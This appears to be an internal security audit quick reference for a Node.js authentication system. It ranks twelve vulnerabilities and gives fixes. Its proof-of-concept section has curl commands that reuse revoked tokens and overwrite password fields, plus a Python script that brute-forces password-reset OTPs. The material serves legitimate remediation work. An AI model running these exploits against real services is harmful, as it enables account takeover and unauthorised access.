# Security Vulnerabilities - Quick Reference

## Critical Vulnerabilities (Fix Immediately)

| # | Vulnerability | Files Affected | Impact |
|---|---------------|----------------|--------|
| 1 | **Token Revocation Bypass** | `userMiddleware.js`, `authenticate.js` | Logged-out users can still access system; revoked tokens remain valid |
| 2 | **Password Field Exposure** | `user.controller.js` | Users can bypass password policies and audit logs |
| 3 | **Missing Admin Authorization** | `admin.route.js` | Regular users could access admin functions if controller checks are forgotten |

## High Severity Vulnerabilities

| # | Vulnerability | Files Affected | Impact |
|---|---------------|----------------|--------|
| 4 | **OTP Brute Force** | `otp.controller.js` | Attackers can try all 1M combinations of 6-digit OTP |
| 5 | **No JWT Secret Rotation** | All auth files | Compromised secret allows token forgery for 7 days |
| 6 | **Weak Password Reset** | `otp.controller.js` | Reset tokens can be reused and used from any IP |
| 7 | **No Password Complexity** | `user.model.js` | Weak passwords allowed (123456, password, etc.) |

## Medium Severity Vulnerabilities

| # | Vulnerability | Files Affected | Impact |
|---|---------------|----------------|--------|
| 8 | **Session Timeout Fails Open** | `sessionTimeout.middleware.js` | Timeout not enforced when Redis is down |
| 9 | **No API Rate Limiting** | `apiKeyAuth.middleware.js` | API abuse and DoS attacks possible |
| 10 | **Cookie Compatibility** | `auth.controller.js` | Auth failures in Safari < 16.4, Firefox < 114 |
| 11 | **Missing HSTS Header** | `security.middleware.js` | Man-in-the-middle attacks possible |

## Low Severity Vulnerabilities

| # | Vulnerability | Files Affected | Impact |
|---|---------------|----------------|--------|
| 12 | **Timing Attacks** | `webauthn.controller.js` | User enumeration via response timing differences |

---

## Quick Fix Commands

### 1. Token Revocation Bypass
```bash
# Add to userMiddleware.js after line that verifies JWT:
const isRevoked = await tokenRevocationService.isTokenRevoked(token);
if (isRevoked) {
  return response.status(401).send({
    error: true,
    message: 'Token has been revoked',
    code: 'TOKEN_REVOKED'
  });
}
```

### 2. Admin Authorization Missing
```bash
# Add to admin.route.js at top:
const { requireAdmin } = require('../middlewares/authorize.middleware');

# Then add to each route:
router.post('/users/:id/revoke-tokens',
  authenticate,
  requireAdmin(),  // ADD THIS LINE
  sensitiveRateLimiter,
  revokeUserTokens
);
```

### 3. Password Field Protection
```bash
# Add to user.controller.js updateUserProfile:
const blockedFields = ['password', 'passwordHistory', 'passwordChangedAt',
                       'passwordExpiresAt', 'mustChangePassword', 'role'];
blockedFields.forEach(field => delete updates[field]);
```

### 4. OTP Rate Limiting
```bash
# Add to otp.controller.js verifyOTP before verification:
const attemptKey = `otp_verify:${email}:${purpose}`;
const attempts = await redis.incr(attemptKey);
if (attempts === 1) await redis.expire(attemptKey, 3600);
if (attempts > 5) {
  return res.status(429).json({
    success: false,
    error: 'Too many verification attempts'
  });
}
```

---

## Proof of Concept Exploits

### Exploit #1: Using Revoked Tokens

```bash
# 1. Login and get token
TOKEN=$(curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"password123"}' \
  | jq -r '.token')

# 2. Logout (should revoke token)
curl -X POST http://localhost:3000/api/auth/logout \
  -H "Cookie: accessToken=$TOKEN"

# 3. VULNERABILITY: Token still works on userMiddleware routes
curl -X GET http://localhost:3000/api/user/profile \
  -H "Cookie: accessToken=$TOKEN"
# Returns 200 with user data (SHOULD BE 401)
```

### Exploit #2: OTP Brute Force

```python
# brute_force_otp.py
import requests
import itertools

email = "victim@example.com"
url = "http://localhost:3000/api/auth/otp/verify"

# Request OTP first
requests.post("http://localhost:3000/api/auth/otp/send",
  json={"email": email, "purpose": "password_reset"})

# Try all 6-digit combinations (no rate limit!)
for otp in itertools.product('0123456789', repeat=6):
    otp_str = ''.join(otp)
    response = requests.post(url, json={
        "email": email,
        "otp": otp_str,
        "purpose": "password_reset"
    })

    if response.status_code == 200:
        print(f"[!] OTP found: {otp_str}")
        print(f"[!] Reset token: {response.json()['resetToken']}")
        break
```

### Exploit #3: Admin Function Access

```bash
# Regular user tries to expire another user's password
curl -X POST http://localhost:3000/api/admin/users/VICTIM_ID/expire-password \
  -H "Cookie: accessToken=REGULAR_USER_TOKEN"

# If controller forgot to check admin role:
# Returns 200 and forces password change (SHOULD BE 403)
```

### Exploit #4: Password Field Update

```bash
# Try to update password without going through password change endpoint
curl -X PATCH http://localhost:3000/api/user/USER_ID \
  -H "Cookie: accessToken=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password":"hacked123","firstName":"John"}'

# If not blocked, password changes without:
# - Old password verification
# - Password history check
# - Audit logging
# - Password policy validation
```

---

## Verification Tests (After Fixes)

### Test Token Revocation Works
```bash
# Should return 401 TOKEN_REVOKED after logout
TOKEN=$(curl -X POST .../login | jq -r '.token')
curl -X POST .../logout -H "Cookie: accessToken=$TOKEN"
curl -X GET .../profile -H "Cookie: accessToken=$TOKEN"
# Expected: {"error":true,"code":"TOKEN_REVOKED"}
```

### Test OTP Rate Limiting
```bash
# Should return 429 after 5 failed attempts
for i in {1..6}; do
  curl -X POST .../otp/verify \
    -d '{"email":"test@test.com","otp":"000000","purpose":"login"}'
done
# 6th attempt: {"error":"Too many verification attempts"}
```

### Test Admin Authorization
```bash
# Non-admin should get 403
curl -X POST .../admin/users/123/revoke-tokens \
  -H "Cookie: accessToken=NON_ADMIN_TOKEN"
# Expected: {"error":"Insufficient permissions","code":"FORBIDDEN"}
```

### Test Password Blocking
```bash
# Should return error about blocked fields
curl -X PATCH .../user/123 \
  -d '{"password":"newpass","email":"new@email.com"}' \
  -H "Cookie: accessToken=$TOKEN"
# Expected: password unchanged, email updated
```

---

## NCA ECC-2:2024 Compliance Status

| Requirement | Status | Issues |
|-------------|--------|--------|
| 2-2-3: Password Policy | ⚠️ Partial | No min length/complexity validation |
| 2-3-1: MFA for Privileged | ✅ Compliant | MFA enforced for admin/owner/partner |
| 2-3-4: Session Management | ⚠️ Partial | Fail-open approach violates secure-by-default |
| 2-4-1: Audit Logging | ✅ Compliant | Comprehensive audit trails |
| 2-5-2: Token Management | ❌ Non-compliant | Revoked tokens not checked everywhere |

**Legend:**
- ✅ Compliant
- ⚠️ Partially Compliant
- ❌ Non-compliant

---

## Attack Scenarios

### Scenario 1: Account Takeover via OTP
1. Attacker knows victim's email
2. Requests password reset OTP
3. Brute forces 6-digit OTP (no rate limit)
4. Gets reset token
5. Changes password
6. **Result:** Full account takeover

### Scenario 2: Persistent Access After Logout
1. Attacker steals JWT token
2. Victim notices suspicious activity
3. Victim logs out from all devices
4. **Problem:** Attacker's token still works on most endpoints
5. **Result:** Data breach continues

### Scenario 3: Privilege Escalation
1. Regular user account compromised
2. Attacker tries admin endpoints
3. If any endpoint lacks role check
4. **Result:** Admin access gained

### Scenario 4: Weak Password Bypass
1. User creates account with password "123456"
2. No complexity validation blocks it
3. Attacker uses common password list
4. **Result:** Easy brute force

---

## Recommended Security Tools

### For Testing
- **OWASP ZAP** - Automated security scanning
- **Burp Suite** - Manual penetration testing
- **jwt.io** - JWT token inspection
- **Postman** - API endpoint testing

### For Monitoring
- **Sentry** - Error tracking and security alerts
- **Datadog** - Application performance monitoring
- **LogRocket** - Session replay for suspicious activity

### For Rate Limiting
- **Redis** - Fast in-memory rate limit counters
- **Express Rate Limit** - Middleware-based limiting

---

## Contact & Escalation

### Severity Levels

**CRITICAL** - Fix within 24 hours
- Token revocation bypass
- Admin authorization missing
- Password field exposure

**HIGH** - Fix within 1 week
- OTP brute force
- Weak password reset
- No password complexity

**MEDIUM** - Fix within 1 month
- Session timeout issues
- API rate limiting
- Browser compatibility

**LOW** - Fix when possible
- Timing attacks
- Minor information disclosure

---

**Last Updated:** 2025-12-22
**Next Review:** 2026-01-22
